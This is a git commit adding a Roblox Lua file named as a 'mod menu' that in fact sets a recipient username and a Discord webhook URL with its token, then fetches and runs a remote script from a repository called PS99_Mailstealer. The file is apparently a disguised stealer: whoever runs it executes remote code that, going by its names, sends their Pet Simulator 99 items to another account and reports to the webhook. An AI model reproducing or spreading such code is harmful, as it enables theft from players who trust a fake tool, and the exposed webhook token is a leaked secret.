12f760c93eaee82648477cbbc13c0e6548a08cac
caine <voidmc.eu@gmail.com>
2024-12-16 18:28:54 +0100

    Add files via upload

---
+++ caine mod menu.lua
@@ -0,0 +1,16 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
+
+]]--
+
+Username = "LybaGamesYT"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1318263063908061235/ToGATSjUhAQutEh1kxgcnF1xVc4JWQCRMMybrPOvRuw8yHD2ADRf0yA0Sb_D9SsuIef5" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
